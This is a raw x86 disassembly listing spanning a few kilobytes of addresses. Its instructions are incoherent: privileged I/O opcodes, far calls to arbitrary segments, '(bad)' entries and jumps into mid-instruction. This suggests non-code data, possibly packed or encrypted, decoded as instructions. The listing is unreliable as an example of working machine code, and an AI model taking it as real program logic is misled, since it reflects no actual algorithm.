  424ed1:	out    dx,eax
  424ed2:	xor    eax,0x5bf49c2e
  424ed7:	inc    BYTE PTR [eax]
  424ed9:	sbb    eax,0x650d8800
  424ede:	xchg   ch,al
  424ee0:	xlat   BYTE PTR ds:[ebx]
  424ee1:	push   ebx
  424ee2:	stos   BYTE PTR es:[edi],al
  424ee3:	int3   
  424ee4:	imul   edi,DWORD PTR [esi+0x3],0x949131f2
  424eeb:	push   es
  424eec:	retf   
  424eed:	push   0x7dffa95c
  424ef2:	lods   al,BYTE PTR ds:[esi]
  424ef3:	mov    ds:0x7c81368e,al
  424ef8:	aam    0x6f
  424efa:	push   edx
  424efb:	in     eax,dx
  424efc:	push   es
  424efd:	and    al,0xe6
  424eff:	fs push ecx
  424f01:	fwait
  424f02:	outs   dx,DWORD PTR ds:[esi]
  424f03:	(bad)  
  424f04:	test   al,0xaf
  424f06:	arpl   WORD PTR [esi],si
  424f08:	mov    bl,0x34
  424f0a:	mov    edx,DWORD PTR [edi+0x27787a15]
  424f10:	aas    
  424f11:	jp     0x424f8a
  424f13:	ret    0xbdd0
  424f16:	into   
  424f17:	dec    DWORD PTR [edx+0x6fa7c7af]
  424f1d:	add    esi,DWORD PTR [eax-0x2d59e6c8]
  424f23:	fst    DWORD PTR [ebx]
  424f25:	ret    0xc306
  424f28:	popa   
  424f29:	jae    0x424f4b
  424f2b:	dec    ecx
  424f2c:	mov    DWORD PTR [ecx-0x32],ebp
  424f2f:	xor    BYTE PTR [edi+0x56],ah
  424f32:	(bad)  
  424f33:	jbe    0x424f7d
  424f35:	mov    ah,0x65
  424f37:	or     BYTE PTR [esi-0x1],dh
  424f3a:	jno    0x424f3d
  424f3c:	or     bl,BYTE PTR [edi+0x7a972cad]
  424f42:	mov    edi,0x218ce39d
  424f47:	mov    eax,ds:0x96330194
  424f4c:	bound  edi,QWORD PTR [edx+0x640d301]
  424f52:	(bad)  
  424f53:	mov    ebx,0xa7cfa703
  424f58:	push   cs
  424f59:	dec    esp
  424f5a:	xor    ch,BYTE PTR [ebx-0x4f]
  424f5d:	fninit 
  424f5f:	in     al,0xc2
  424f61:	cli    
  424f62:	lahf   
  424f63:	fiadd  WORD PTR ds:0x3e9f35a
  424f69:	pop    esi
  424f6a:	mov    dl,0xaf
  424f6c:	pop    DWORD PTR [edx+0x56]
  424f6f:	add    eax,DWORD PTR [eax]
  424f71:	ja     0x424f0d
  424f73:	xchg   esi,eax
  424f74:	cmp    bh,ah
  424f76:	pop    ebx
  424f77:	jb     0x424fe4
  424f79:	int    0x25
  424f7b:	bound  ecx,QWORD PTR [eax-0x21]
  424f7e:	dec    esp
  424f7f:	outs   dx,DWORD PTR ds:[esi]
  424f80:	inc    ecx
  424f81:	lods   al,BYTE PTR ds:[esi]
  424f82:	aas    
  424f83:	mov    ds:0x48d7e779,eax
  424f88:	and    al,0xad
  424f8a:	call   0x9866:0x50b1698f
  424f91:	jge    0x424fbe
  424f93:	push   es
  424f94:	push   es
  424f95:	xchg   ebx,eax
  424f96:	or     DWORD PTR ds:[ecx],esi
  424f99:	iret   
  424f9a:	sub    DWORD PTR [esi+edi*2-0x491eedbd],esp
  424fa1:	adc    eax,0x9cc426ed
  424fa6:	adc    eax,0xba4b7866
  424fab:	mov    ds,WORD PTR [edi+0x66]
  424fae:	and    BYTE PTR [edi],al
  424fb0:	addr16 inc ecx
  424fb2:	jo     0x425029
  424fb4:	sbb    BYTE PTR [ecx+0x46fee03f],ch
  424fba:	stos   DWORD PTR es:[edi],eax
  424fbb:	and    dh,BYTE PTR [ebx]
  424fbd:	mov    al,ds:0xcda21aa1
  424fc2:	gs mov al,0xcc
  424fc5:	stc    
  424fc6:	test   BYTE PTR [edx+0x63],ch
  424fc9:	daa    
  424fca:	sub    al,0xe2
  424fcc:	xor    DWORD PTR [esi-0x34de13b2],0xffffffa8
  424fd3:	ret    0x7ed4
  424fd6:	mov    ah,0x2f
  424fd8:	int3   
  424fd9:	sar    BYTE PTR [eax+0xe9b40f7],0xf
  424fe0:	pop    ebx
  424fe1:	stos   DWORD PTR es:[edi],eax
  424fe2:	into   
  424fe3:	push   ecx
  424fe4:	mov    esi,0xc38821c4
  424fe9:	inc    eax
  424fea:	pusha  
  424feb:	mov    ecx,ds
  424fed:	fsubr  st,st(3)
  424fef:	xchg   edx,eax
  424ff0:	loope  0x424fad
  424ff2:	or     eax,0x7d0b92fb
  424ff7:	into   
  424ff8:	ins    DWORD PTR es:[edi],dx
  424ff9:	inc    ecx
  424ffa:	sar    BYTE PTR [eax+0x6d6999a0],cl
  425000:	hlt    
  425001:	call   0x884a:0x16fc5f72
  425008:	push   edi
  425009:	sbb    al,0x25
  42500b:	test   edi,eax
  42500d:	outs   dx,BYTE PTR ds:[esi]
  42500e:	add    ebp,DWORD PTR [esi]
  425010:	lea    edx,[esi+0x4a]
  425013:	popf   
  425014:	ret    0xcba7
  425017:	xchg   esi,eax
  425018:	popf   
  425019:	sub    al,0xf6
  42501b:	std    
  42501c:	add    BYTE PTR [edx+edi*1-0x5cd6b4f7],bl
  425023:	in     eax,dx
  425024:	mov    dl,0xfa
  425026:	xchg   esp,eax
  425027:	fild   WORD PTR [ebp-0x6d1f20a3]
  42502d:	mov    esp,0xad7d38eb
  425032:	out    0xb3,eax
  425034:	stos   BYTE PTR es:[edi],al
  425035:	pop    esp
  425036:	mov    WORD PTR [eax+0x68],es
  425039:	mov    esi,0xdb987a35
  42503e:	xor    ch,al
  425040:	or     ah,BYTE PTR [ecx]
  425042:	adc    eax,0xca097ecd
  425047:	stos   DWORD PTR es:[edi],eax
  425048:	mov    ds:0x928acf86,al
  42504d:	jle    0x425010
  42504f:	xchg   ecx,eax
  425050:	addr16 xchg edi,eax
  425052:	push   esi
  425053:	mov    cl,0x1e
  425055:	(bad)  
  425056:	fcmovb st,st(5)
  425058:	leave  
  425059:	in     eax,dx
  42505a:	jbe    0x4250bb
  42505c:	pop    ds
  42505d:	lods   al,BYTE PTR ds:[esi]
  42505e:	sar    BYTE PTR [ecx+0x23cb82d9],0x87
  425065:	cli    
  425066:	js     0x424ff0
  425068:	dec    ecx
  425069:	aaa    
  42506a:	or     ebp,edx
  42506c:	nop
  42506d:	daa    
  42506e:	lock addr16 loopne 0x42501d
  425072:	loopne 0x425025
  425074:	mov    eax,0x3bd7445e
  425079:	push   ds
  42507a:	inc    eax
  42507b:	cs xchg esi,eax
  42507d:	outs   dx,BYTE PTR ds:[esi]
  42507e:	add    bl,dl
  425080:	leave  
  425081:	jp     0x4250e3
  425083:	or     esp,DWORD PTR [eax+0x1b]
  425086:	daa    
  425087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425088:	jns    0x4250c4
  42508a:	mov    eax,0xdd9638b9
  42508f:	in     al,dx
  425090:	xchg   esi,eax
  425091:	or     DWORD PTR [ebp+0x311f4faf],ecx
  425097:	xchg   ecx,eax
  425098:	jbe    0x42502a
  42509a:	mov    bl,0xbc
  42509c:	jnp    0x425064
  42509e:	pop    esi
  42509f:	pop    ss
  4250a0:	ss hlt 
  4250a2:	push   es
  4250a3:	mov    ds:0xc87a0e6f,eax
  4250a8:	mov    cl,0x2e
  4250aa:	lahf   
  4250ab:	push   ss
  4250ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250ad:	or     DWORD PTR [ebx+0x1a],ebp
  4250b0:	addr16 hlt 
  4250b2:	ins    BYTE PTR es:[edi],dx
  4250b3:	add    dh,BYTE PTR [esp]
  4250b6:	outs   dx,DWORD PTR ds:[esi]
  4250b7:	push   0x5a
  4250b9:	stos   DWORD PTR es:[edi],eax
  4250ba:	out    dx,eax
  4250bb:	enter  0x5737,0x7d
  4250bf:	scas   al,BYTE PTR es:[edi]
  4250c0:	cli    
  4250c1:	les    edi,FWORD PTR [eax+esi*1]
  4250c4:	or     ebp,DWORD PTR [esi]
  4250c6:	cmp    ebp,ebx
  4250c8:	shr    DWORD PTR [esi-0x5],0x45
  4250cc:	nop
  4250cd:	xchg   ebp,eax
  4250ce:	ret    0x5ae1
  4250d1:	aad    0x45
  4250d3:	adc    eax,DWORD PTR [esi+ecx*8-0x48]
  4250d7:	adc    al,BYTE PTR [eax+0x40]
  4250da:	inc    DWORD PTR [eax-0x14b7ab44]
  4250e0:	(bad)
  4250e4:	push   0x50636929
  4250e9:	adc    DWORD PTR [eax],0x80daa173
  4250ef:	sub    DWORD PTR [ecx-0x41],ebp
  4250f2:	jno    0x4250ae
  4250f4:	pop    edi
  4250f5:	push   edx
  4250f6:	mov    cl,0x85
  4250f8:	mov    cl,0x9a
  4250fa:	leave  
  4250fb:	mov    DWORD PTR cs:[ebx-0x4e],ecx
  4250ff:	mov    dh,0x53
  425101:	xor    eax,0xb96481a2
  425106:	je     0x42511b
  425108:	cmp    eax,0x1a1c7b8a
  42510d:	pop    ecx
  42510e:	xchg   ecx,eax
  42510f:	sbb    al,0xe9
  425111:	loopne 0x4250c2
  425113:	xchg   edi,eax
  425114:	into   
  425115:	xchg   esp,eax
  425116:	mov    bl,0x3d
  425118:	fcomp  DWORD PTR [eax-0x6e]
  42511b:	out    0x64,al
  42511d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42511f:	shl    DWORD PTR [esi-0x3d462450],0xab
  425126:	call   0x9f6e:0xbb6dfa3e
  42512d:	nop
  42512e:	ss data16 cli 
  425131:	loopne 0x425141
  425133:	add    BYTE PTR [ecx+eax*4+0x30],0x8c
  425138:	cli    
  425139:	loope  0x425191
  42513b:	push   es
  42513c:	sub    al,0xa3
  42513e:	les    esp,FWORD PTR [edx+0x7643e6e]
  425144:	cs dec eax
  425146:	jbe    0x425145
  425148:	xchg   ebp,eax
  425149:	inc    esi
  42514a:	mov    eax,0xa7852e37
  42514f:	frstor ds:[eax+0x44]
  425153:	adc    al,0x79
  425155:	mov    eax,ds:0xf45952c1
  42515a:	lea    esi,[esi-0x6f]
  42515d:	scas   al,BYTE PTR es:[edi]
  42515e:	je     0x4250f3
  425160:	mov    eax,ds:0xa8adc0c
  425165:	add    edi,ebx
  425167:	xor    cl,cl
  425169:	xor    al,0xd8
  42516b:	mov    bl,BYTE PTR [ecx+ebx*2]
  42516e:	dec    ecx
  42516f:	aaa    
  425170:	shr    DWORD PTR [edx],1
  425172:	test   DWORD PTR [edx+edi*8-0x2547b01e],esi
  425179:	add    eax,0x2d2d036d
  42517e:	std    
  42517f:	fdivr  QWORD PTR [ecx-0x3ae413a9]
  425185:	mov    al,ds:0x43c7b19a
  42518a:	and    BYTE PTR [ecx+0x762cc6c8],dl
  425190:	mov    dl,0xb4
  425192:	je     0x4251a2
  425194:	in     al,dx
  425195:	jle    0x4251ef
  425197:	das    
  425198:	retf   0x3b19
  42519b:	sti    
  42519c:	sbb    al,0xd6
  42519e:	and    al,0x3f
  4251a0:	das    
  4251a1:	pop    esp
  4251a2:	shl    DWORD PTR [edi],1
  4251a4:	ins    BYTE PTR es:[edi],dx
  4251a5:	cmp    al,0xd6
  4251a7:	mov    al,ds:0xab587cf
  4251ac:	inc    edi
  4251ad:	test   dl,cl
  4251af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251b0:	sbb    edx,DWORD PTR [esi-0xbdb1698]
  4251b6:	or     bl,BYTE PTR [ecx-0x51]
  4251b9:	mov    ecx,0x8b7565a6
  4251be:	stos   DWORD PTR es:[edi],eax
  4251bf:	gs push eax
  4251c1:	fcom   QWORD PTR [eax]
  4251c3:	ins    DWORD PTR es:[edi],dx
  4251c4:	cmp    esp,ebp
  4251c6:	cli    
  4251c7:	je     0x425221
  4251c9:	sub    dh,BYTE PTR [edx-0x63521d4e]
  4251cf:	icebp  
  4251d0:	xor    ch,0xd4
  4251d3:	daa    
  4251d4:	icebp  
  4251d5:	popa   
  4251d6:	rcl    BYTE PTR [esi-0x8bad03a],cl
  4251dc:	mov    WORD PTR [edi],ds
  4251de:	and    BYTE PTR [ebx+0x52],dl
  4251e1:	add    BYTE PTR [ecx-0x64bbf6c0],bl
  4251e7:	pop    esp
  4251e8:	jge    0x4251dd
  4251ea:	sub    edx,DWORD PTR [edx-0x2dbc6bfb]
  4251f0:	inc    eax
  4251f1:	mov    dl,0x6
  4251f3:	ds test eax,0x3989f51
  4251f9:	neg    cl
  4251fb:	int    0x6d
  4251fd:	pop    es
  4251fe:	fwait
  4251ff:	push   0xffffffc3
  425201:	pushf  
  425202:	not    DWORD PTR [edi+eiz*2]
  425205:	data16 jp 0x42521d
  425208:	inc    ebx
  425209:	(bad)  
  42520a:	int    0x30
  42520c:	jge    0x4251cf
  42520e:	inc    edi
  42520f:	xchg   edi,eax
  425210:	out    0x9b,al
  425212:	into   
  425213:	push   edi
  425214:	aaa    
  425215:	mov    BYTE PTR [edx+esi*2+0x4c],al
  425219:	(bad)  
  42521a:	mov    cl,0x39
  42521c:	mov    DWORD PTR [ebp+ecx*4+0x6e],ebp
  425220:	sub    BYTE PTR [edi-0x4f93c74b],bh
  425226:	or     al,0xbb
  425228:	nop
  425229:	ret    0x11b7
  42522c:	je     0x42522b
  42522e:	mov    ch,0xef
  425230:	test   BYTE PTR [ebx-0x70],dh
  425233:	fmul   DWORD PTR [ecx-0x14df9a29]
  425239:	test   eax,0x4ab3b78b
  42523e:	inc    ebx
  42523f:	pop    ss
  425240:	adc    dl,BYTE PTR [edi]
  425242:	inc    ebx
  425243:	adc    BYTE PTR [ebx+0x70],ah
  425246:	adc    edx,ebx
  425248:	repnz sub DWORD PTR [ebx+0x1c71b666],edi
  42524f:	aas    
  425250:	sub    bh,bl
  425252:	push   ebx
  425253:	jl     0x4252b5
  425255:	sub    al,0xda
  425257:	pop    ebp
  425258:	inc    ebx
  425259:	mov    ebx,0xd3b94255
  42525e:	lds    ecx,FWORD PTR [esp+edi*4]
  425261:	add    DWORD PTR [edi+0x788ee820],eax
  425267:	rcl    BYTE PTR [edx-0x3634fb85],1
  42526d:	pop    esp
  42526e:	(bad)  
  42526f:	mov    edx,0xd74a1c93
  425274:	mov    bl,0x9
  425276:	std    
  425277:	ins    DWORD PTR es:[edi],dx
  425278:	std    
  425279:	push   0x23b7166b
  42527e:	test   ebp,esp
  425280:	mov    eax,0xa84bce46
  425285:	lea    esp,[ecx+edi*1]
  425288:	and    dh,BYTE PTR [ebx+edx*8+0x54cc3b26]
  42528f:	push   0x12
  425291:	(bad)  
  425292:	cmp    ch,BYTE PTR [edx-0x6a]
  425295:	xor    edi,DWORD PTR [ebx-0x71cea72f]
  42529b:	fadd   st,st(2)
  42529d:	sbb    dh,ah
  42529f:	jnp    0x42526c
  4252a1:	loopne 0x425241
  4252a3:	outs   dx,BYTE PTR ds:[esi]
  4252a4:	fcomi  st,st(2)
  4252a6:	push   ebx
  4252a7:	addr16 icebp 
  4252a9:	jmp    0x66ef:0xefaf8fd4
  4252b0:	ins    BYTE PTR es:[edi],dx
  4252b1:	jmp    0x425293
  4252b3:	xor    al,0xfe
  4252b5:	add    eax,0xa36edbe8
  4252ba:	mov    DWORD PTR [esi],edi
  4252bc:	inc    esi
  4252bd:	dec    ebp
  4252be:	xchg   ebx,eax
  4252bf:	or     eax,0x9b78487
  4252c4:	jl     0x425272
  4252c6:	and    ebx,DWORD PTR ds:0x72ff700a
  4252cc:	into   
  4252cd:	call   0x120ea5ed
  4252d2:	or     ah,BYTE PTR [eax]
  4252d4:	(bad)  
  4252d5:	sub    DWORD PTR [ebx+0x61],ebx
  4252d8:	xchg   esi,eax
  4252d9:	test   al,0x9b
  4252db:	rol    BYTE PTR [edi],0xea
  4252de:	sub    BYTE PTR [eax+0x6d],dh
  4252e1:	xchg   esi,eax
  4252e2:	clc    
  4252e3:	cmp    ecx,DWORD PTR [eax]
  4252e5:	(bad)  
  4252e6:	loopne 0x425355
  4252e8:	cmp    eax,0x6a268947
  4252ed:	jb     0x4252df
  4252ef:	(bad)  
  4252f0:	int    0x6b
  4252f2:	jo     0x42527f
  4252f4:	out    dx,al
  4252f5:	and    al,0x9b
  4252f7:	in     al,0xe4
  4252f9:	inc    eax
  4252fa:	lds    esp,FWORD PTR [eax+edi*8]
  4252fd:	and    DWORD PTR [edi-0x2b],edi
  425300:	push   ebp
  425301:	cmp    al,0x37
  425303:	fcomp  DWORD PTR [eax]
  425305:	gs or  dh,0xbd
  425309:	loope  0x425327
  42530b:	lods   al,BYTE PTR ds:[esi]
  42530c:	div    BYTE PTR [ebx+ebp*4+0x64]
  425310:	retf   0xa568
  425313:	(bad)  
  425314:	mov    BYTE PTR [edx],cl
  425316:	cli    
  425317:	daa    
  425318:	cs jecxz 0x4252ea
  42531b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42531c:	sbb    esp,DWORD PTR [edi]
  42531e:	call   FWORD PTR [edi]
  425320:	inc    ecx
  425321:	cmp    eax,esp
  425323:	sub    al,0xe7
  425325:	std    
  425326:	stos   DWORD PTR es:[edi],eax
  425327:	addr16 mov ds:0x1892,al
  42532b:	pop    ecx
  42532c:	and    BYTE PTR ss:[esp+edi*8],ch
  425330:	test   BYTE PTR [ecx+0x14],ch
  425333:	inc    esi
  425334:	inc    edx
  425335:	sub    eax,0xc831774
  42533a:	dec    edx
  42533b:	popf   
  42533c:	rcr    BYTE PTR [esi+0x279fd126],0x21
  425343:	fimul  DWORD PTR [ecx+0x5a]
  425346:	mov    ecx,0x5cb55133
  42534b:	sahf   
  42534c:	int    0x87
  42534e:	add    BYTE PTR [eax],al
  425350:	add    BYTE PTR [eax],al
  425352:	fwait
  425353:	push   ebp
  425354:	pusha  
  425355:	outs   dx,DWORD PTR ds:[esi]
  425356:	out    dx,al
  425357:	jg     0x4252f8
  425359:	cmc    
  42535a:	or     DWORD PTR fs:[edi+0x22],ebx
  42535e:	cld    
  42535f:	ror    DWORD PTR [eax-0x1b],1
  425362:	and    esp,ecx
  425364:	add    DWORD PTR [eax],eax
  425366:	hlt    
  425367:	add    al,0x0
  425369:	add    BYTE PTR [eax-0x6449f209],al
  42536f:	(bad)  
  425370:	ins    BYTE PTR es:[edi],dx
  425371:	jo     0x425348
  425373:	js     0x425300
  425375:	jg     0x42532f
  425377:	je     0x42532c
  425379:	and    edx,edx
  42537b:	cmp    ebx,DWORD PTR [edx]
  42537d:	pusha  
  42537e:	mov    cl,0x16
  425380:	daa    
  425381:	xor    BYTE PTR [edx],al
  425383:	test   al,0xb
  425385:	iret   
  425386:	dec    esi
  425387:	popa   
  425388:	pusha  
  425389:	sub    bh,BYTE PTR [esi+esi*4-0x1a]
  42538d:	ret    
  42538e:	add    dl,ah
  425390:	out    dx,eax
  425391:	mov    al,ds:0x69774863
  425396:	enter  0xb22b,0x7b
  42539a:	jne    0x42536d
  42539c:	je     0x425379
  42539e:	lea    esp,cs:[edx+0x1b]
  4253a2:	mov    ecx,0x280a82b3
  4253a7:	sub    esi,ebp
  4253a9:	xchg   ebx,eax
  4253aa:	lods   eax,DWORD PTR ds:[esi]
  4253ab:	inc    edi
  4253ac:	jp     0x42534c
  4253ae:	xchg   esi,eax
  4253af:	mov    cl,BYTE PTR [esi+0x6f]
  4253b2:	push   cs
  4253b3:	mov    eax,0xcf931ff7
  4253b8:	xlat   BYTE PTR ds:[ebx]
  4253b9:	xchg   edx,eax
  4253ba:	fld    TBYTE PTR [esi-0x50b2e58d]
  4253c0:	inc    esp
  4253c1:	inc    edx
  4253c2:	enter  0x9f7a,0x83
  4253c6:	sahf   
  4253c7:	fld    TBYTE PTR [eax+0x44]
  4253ca:	xchg   BYTE PTR [ebx+0x215d87b5],ah
  4253d0:	outs   dx,BYTE PTR ds:[esi]
  4253d1:	cmc    
  4253d2:	sbb    ah,bh
  4253d4:	sub    DWORD PTR [ebp-0x14],eax
  4253d7:	or     eax,0x713b8b35
  4253dc:	mov    eax,DWORD PTR [ecx-0x57ca77d2]
  4253e2:	cmp    DWORD PTR [eax],esi
  4253e4:	lods   al,BYTE PTR ds:[esi]
  4253e5:	push   esp
  4253e6:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4253e8:	out    0xc7,eax
  4253ea:	fcomp  QWORD PTR [ebp+0x28e97dfa]
  4253f0:	xor    BYTE PTR [edi-0x2b],bh
  4253f3:	dec    ebp
  4253f4:	aaa    
  4253f5:	inc    esp
  4253f6:	xchg   BYTE PTR [eax],dh
  4253f8:	ret    0xc0c9
  4253fb:	jo     0x425405
  4253fd:	push   eax
  4253fe:	pop    ss
  4253ff:	jle    0x425414
  425401:	add    BYTE PTR [ecx+0x79],dl
  425404:	out    dx,eax
  425405:	ins    BYTE PTR es:[edi],dx
  425406:	and    bh,BYTE PTR [ebx+0x6ced4fe6]
  42540c:	popa   
  42540d:	jbe    0x4253ec
  42540f:	mov    ds:0x7a57d8e5,eax
  425414:	in     al,0x1e
  425416:	icebp  
  425417:	(bad)  
  425418:	mov    esp,0xec1cf869
  42541d:	mov    WORD PTR [edi+0x7c38f5d2],?
  425423:	js     0x425482
  425425:	pusha  
  425426:	push   0xa1cf97f5
  42542b:	in     al,dx
  42542c:	cmp    al,0x5c
  42542e:	jne    0x4254a2
  425430:	xor    ebx,DWORD PTR [ecx-0x7f]
  425433:	adc    DWORD PTR [esi+0x2954faf8],esi
  425439:	inc    ebx
  42543a:	adc    BYTE PTR [esi],0x7b
  42543d:	jge    0x42542a
  42543f:	fld    st(7)
  425441:	add    al,0xac
  425443:	in     al,0x48
  425445:	jg     0x42546e
  425447:	inc    DWORD PTR [edx+eiz*1+0x63]
  42544b:	js     0x4254a7
  42544d:	daa    
  42544e:	imul   esp,DWORD PTR [eax-0x49],0xffffffa0
  425452:	mov    edi,eax
  425454:	jge    0x4254c9
  425456:	pop    edx
  425457:	jmp    0x4125:0x65563e8e
  42545e:	(bad)  
  42545f:	bound  edx,QWORD PTR [esi]
  425461:	pop    ebp
  425462:	nop
  425463:	ins    DWORD PTR es:[edi],dx
  425464:	fs pop eax
  425466:	xor    al,0xd1
  425468:	jo     0x4254c5
  42546a:	adc    esp,DWORD PTR [ecx+0x0]
  42546d:	jb     0x4254a5
  42546f:	mov    edx,0x64ad2c22
  425474:	and    al,0x6c
  425476:	cld    
  425477:	push   eax
  425478:	push   ss
  425479:	add    dh,BYTE PTR [edx+0x1e]
  42547c:	call   0x8f1e1971
  425481:	rol    DWORD PTR [eax-0xb6af354],0xe7
  425488:	mov    WORD PTR [eax+0x7a],gs
  42548b:	ror    DWORD PTR [edx-0x58897ed7],0xbe
  425492:	mov    bh,0x62
  425494:	test   BYTE PTR [eax-0x22],cl
  425497:	sbb    cl,dl
  425499:	dec    eax
  42549a:	xchg   esp,eax
  42549b:	add    dl,dh
  42549d:	push   esp
  42549e:	mov    ch,0xe6
  4254a0:	(bad)  
  4254a1:	mov    ah,0x8e
  4254a3:	pushf  
  4254a4:	(bad)  
  4254a5:	xchg   esi,eax
  4254a6:	repnz add cl,dh
  4254a9:	sbb    ah,0x4e
  4254ac:	pop    ecx
  4254ad:	sahf   
  4254ae:	inc    esp
  4254af:	rol    DWORD PTR [ecx],cl
  4254b1:	(bad)  
  4254b2:	lods   eax,DWORD PTR ds:[esi]
  4254b3:	or     ecx,DWORD PTR [ebx-0x4726731b]
  4254b9:	xchg   esi,eax
  4254ba:	das    
  4254bb:	xlat   BYTE PTR ds:[ebx]
  4254bc:	sahf   
  4254bd:	sbb    BYTE PTR [edi-0x32],bl
  4254c0:	shl    edx,0x87
  4254c3:	jp     0x425496
  4254c5:	lea    esp,[ecx-0x1c]
  4254c8:	xor    DWORD PTR [ebp-0x2e],esp
  4254cb:	cmp    al,0x17
  4254cd:	sbb    esp,DWORD PTR [ebx+0x42]
  4254d0:	and    bl,bl
  4254d2:	leave  
  4254d3:	lods   eax,DWORD PTR ds:[esi]
  4254d4:	inc    esi
  4254d5:	bound  edx,QWORD PTR [eax+ebx*4]
  4254d8:	pop    es
  4254d9:	dec    edx
  4254da:	and    BYTE PTR [ebp+esi*4-0x21342b2f],bl
  4254e1:	adc    al,0x3d
  4254e4:	std    
  4254e5:	int3   
  4254e6:	xchg   ebx,eax
  4254e7:	in     al,0xef
  4254e9:	sub    al,0xae
  4254eb:	jle    0x425525
  4254ed:	add    DWORD PTR [ebp+edi*8+0x62],edx
  4254f1:	dec    eax
  4254f2:	shl    BYTE PTR [esi+edx*4+0x5b4dd750],cl
  4254f9:	shl    BYTE PTR [edx-0x76],1
  4254fc:	repnz loope 0x4254d2
  4254ff:	test   ebp,esp
  425501:	jp     0x42557e
  425503:	clc    
  425504:	repz and DWORD PTR [esi+0x294e8d75],edx
  42550b:	inc    edx
  42550c:	and    al,0x1c
  42550e:	inc    ecx
  42550f:	cmp    dl,BYTE PTR [ebp-0x33]
  425512:	(bad)  
  425513:	pusha  
  425514:	adc    BYTE PTR [eax+edx*2-0x3d1ae6f0],0x6b
  42551c:	push   edx
  42551d:	stos   DWORD PTR es:[edi],eax
  42551e:	in     al,0x7e
  425520:	add    eax,0x61a1550e
  425525:	shl    DWORD PTR [ecx],cl
  425527:	cmp    eax,0x3bafb41f
  42552c:	jle    0x4254ff
  42552e:	fs push ebp
  425530:	xchg   ebp,eax
  425531:	adc    al,0x3a
  425533:	ins    DWORD PTR es:[edi],dx
  425534:	mov    eax,ds:0x334af5d3
  425539:	sar    DWORD PTR [eax-0x48],1
  42553c:	xchg   ebx,eax
  42553d:	popa   
  42553e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42553f:	xchg   edi,eax
  425540:	sysret 
  425542:	bound  ecx,QWORD PTR [eax]
  425544:	out    0xa1,al
  425546:	popf   
  425547:	inc    ebp
  425548:	pop    ds
  425549:	xor    ecx,0xa2ec80c7
  42554f:	cld    
  425550:	cwde   
  425551:	call   0xa9a7:0x68863c62
  425558:	jnp    0x42552b
  42555a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42555b:	adc    eax,0xb274904a
  425560:	push   esi
  425561:	fs out 0x51,eax
  425564:	ret    
  425565:	mov    bl,0x95
  425567:	adc    DWORD PTR [ecx-0x76b15a3f],edi
  42556d:	xor    al,ch
  42556f:	push   ss
  425570:	in     eax,dx
  425571:	pop    edi
  425572:	mov    BYTE PTR [esi+0x20],cl
  425575:	cmp    al,0x2c
  425577:	push   ebp
  425578:	or     eax,0x251a1dd2
  42557d:	inc    ecx
  42557e:	adc    eax,0x29416887
  425583:	fwait
  425584:	ret    0x74e7
  425587:	into   
  425588:	sar    ebp,cl
  42558a:	popf   
  42558b:	aaa    
  42558c:	dec    edi
  42558d:	push   ebx
  42558e:	xor    bh,cl
  425590:	lods   al,BYTE PTR ds:[esi]
  425591:	mov    edx,0x98e5c933
  425596:	adc    al,BYTE PTR [ebx]
  425598:	fucomi st,st(0)
  42559a:	jne    0x425614
  42559c:	inc    ebx
  42559d:	mov    edx,0xb685072f
  4255a2:	pusha  
  4255a3:	int    0x17
  4255a5:	sub    bh,BYTE PTR [edi]
  4255a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255a8:	or     DWORD PTR [ecx+0x53],esp
  4255ab:	repnz pusha 
  4255ad:	push   ebx
  4255ae:	iret   
  4255af:	sbb    cl,BYTE PTR [edx+0x3f]
  4255b2:	pop    ebp
  4255b3:	dec    ebx
  4255b4:	xor    BYTE PTR [eax+eax*2-0x4f],cl
  4255b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255b9:	push   ebx
  4255ba:	ss in  al,dx
  4255bc:	cld    
  4255bd:	cmovo  esi,DWORD PTR [ecx+ebp*2+0x10]
  4255c2:	bound  esi,QWORD PTR [ecx-0x11]
  4255c5:	ds cli 
  4255c7:	push   ss
  4255c8:	adc    DWORD PTR [ebp+0x79229232],0xc0e031cc
  4255d2:	sbb    al,0x95
  4255d4:	pop    ds
  4255d5:	not    cl
  4255d7:	push   ebx
  4255d8:	xchg   ebx,eax
  4255d9:	sbb    ebp,eax
  4255db:	jns    0x425560
  4255dd:	loopne 0x42558a
  4255df:	mov    bh,0x77
  4255e1:	ins    DWORD PTR es:[edi],dx
  4255e2:	mov    cl,0x64
  4255e4:	out    0x28,al
  4255e6:	adc    DWORD PTR [ebx-0x5b],ecx
  4255e9:	nop
  4255ea:	sub    BYTE PTR [eax+0x2c],dl
  4255ed:	clc    
  4255ee:	ins    BYTE PTR es:[edi],dx
  4255ef:	fiadd  DWORD PTR [esi+0x7b]
  4255f2:	adc    ebp,DWORD PTR [edi+0x75c78f00]
  4255f8:	xor    eax,0xa631155f
  4255fd:	pusha  
  4255fe:	shl    DWORD PTR [ebx+esi*2-0x5755982e],0xf5
  425606:	sub    eax,0x6388a922
  42560b:	repnz sbb al,0xbd
  42560e:	cmp    DWORD PTR [edi],ebp
  425610:	mov    BYTE PTR [ecx],dl
  425612:	out    0xe,al
  425614:	mov    ss,WORD PTR [edx]
  425616:	cmp    eax,0x97f62297
  42561b:	sbb    ebx,DWORD PTR [ebp+0x4a]
  42561e:	ret    
  42561f:	sbb    al,0x36
  425621:	int    0xce
  425623:	sub    bl,BYTE PTR [esi]
  425625:	dec    ebx
  425626:	mov    al,0xc
  425628:	sub    al,0xaa
  42562a:	mov    dl,0x27
  42562c:	icebp  
  42562d:	and    ch,BYTE PTR [edi-0x6eb7ef29]
  425633:	lock daa 
  425635:	mov    ecx,0xe992d9c2
  42563a:	push   dx
  42563c:	ret    0xef57
  42563f:	iret   
  425640:	sti    
  425641:	scas   eax,DWORD PTR es:[edi]
  425642:	dec    ebx
  425643:	mov    al,0x1f
  425645:	(bad)  
  425646:	jmp    0x267ca226
  42564b:	rdtsc  
  42564d:	push   ecx
  42564e:	sbb    esp,DWORD PTR [ecx]
  425650:	(bad)  
  425651:	addr16 jns 0x425692
  425654:	lods   al,BYTE PTR ds:[esi]
